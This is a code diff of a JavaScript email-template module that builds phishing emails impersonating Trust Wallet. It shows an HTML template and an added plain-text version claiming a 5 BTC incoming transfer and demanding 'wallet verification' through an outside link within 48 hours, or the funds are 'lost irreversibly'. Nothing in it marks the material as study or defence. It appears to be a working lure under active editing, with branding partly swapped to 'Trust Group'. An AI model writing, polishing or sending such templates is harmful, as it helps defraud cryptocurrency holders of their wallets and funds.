@@ -48,32 +48,64 @@
           src="http://localhost:5173/trust.png"
           width="50"
           height="50"
-          style="border-radius: 25px; background-color: white"
-        />
+          style="border-radius: 25px; background-color: white" />
       </div>
       <div class="content">
         <p>
-          We are pleased to inform you that our system has detected an incoming
-          transfer of 5 BTC to your Trust wallet. This transaction originates
-          from wallet address bc1q7...p3k and has been securely queued in our
-          blockchain processing center.
+          message....
         </p>
 
         <p>
-          For security reasons, incoming transfers above 100 ETH require account
-          verification before release. Please complete the verification process
-          by accessing the secure link below:
+          message...
         </p>
-        <a href="#" class="button">Verify Wallet</a>
+        <a href="#" class="button">Verify</a>
         <p style="font-size: small">
           Important: If you do not complete verification within 48 hours, this
           transaction will be permanently removed from our system and the funds
-          will be lost irreversibly.
+          will be lost irreversibly.
         </p>
       </div>
       <div class="footer">
-        <p>© ${new Date().getFullYear()} Trust Wallet. All rights reserved.</p>
+        <p>© ${new Date().getFullYear()} Trust. All rights reserved.</p>
       </div>
     </div>
   </body>
 </html>
+
+v1: {
+subject: "Verify Your Trust Account",
+getHtml: () => `
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  </head>
+  <body style="margin: 0; padding: 0; font-family: Arial, sans-serif;">
+    <!-- Your improved HTML here -->
+  </body>
+</html>
+`,
+// ✅ Add this getText method
+getText: () => `
+Trust
+
+We are pleased to inform you that our system has detected an incoming
+transfer of 5 BTC to your Trust wallet. This transaction originates
+from wallet address bc1q7...p3k and has been securely queued in our
+blockchain processing center.
+
+For security reasons, incoming transfers above 100 ETH require account
+verification before release. Please complete the verification process
+by accessing the secure link below:
+
+Verify Wallet:
+https://trustgroupcenter.com
+
+Important: If you do not complete verification within 48 hours, this
+transaction will be permanently removed from our system and the funds
+will be lost irreversibly.
+
+© ${new Date().getFullYear()} Trust Group. All rights reserved.
+`.trim()
+}
